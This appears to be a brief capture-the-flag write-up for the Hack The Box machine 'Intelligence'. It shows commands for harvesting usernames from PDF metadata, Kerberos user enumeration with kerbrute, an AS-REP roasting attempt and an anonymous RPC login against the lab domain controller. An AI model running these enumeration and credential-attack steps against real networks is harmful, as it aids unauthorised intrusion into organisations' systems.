## Info

### System
- hostname: `intelligence.htb`, `intelligence.htb0`

### PDF
- William.Lee
- Jose.Williams


## Path
### User
1. Found 2 PDF at `/documents`. After finding `2020-01-02-upload.pdf` existed, I wrote `pdf-list.py` to get all PDF.
2. Extract the possible usernames from PDF.
```
$ for f in $(find . -name '*.pdf' | sort ); do pdf-parser $f | grep Creator ; done > user.lst
$ vim user.lst   # do some modify
$ kerbrute_linux_amd64 userenum -d intelligence.htb --dc intelligence.htb ./valid-user.lst
$ vim  # remove domain
$ sort ./valid-user.lst | uniq > uniq-valid-user.lst
```
3. Did AS-REP roasting, found nothing.
```
$ cme ldap $ip -u ./uniq-valid-user.lst -p '' --asreproast asrep.out
LDAP        10.10.10.248    389    DC               [*] Windows 10.0 Build 17763 x64 (name:DC) (domain:intelligence.htb) (signing:True) (SMBv1:False)
```
4. Logonned RPC and tried to query user info, but found nothing.
```
$ rpcclient -U '' $ip
$ queryuser William.Lee
...
```
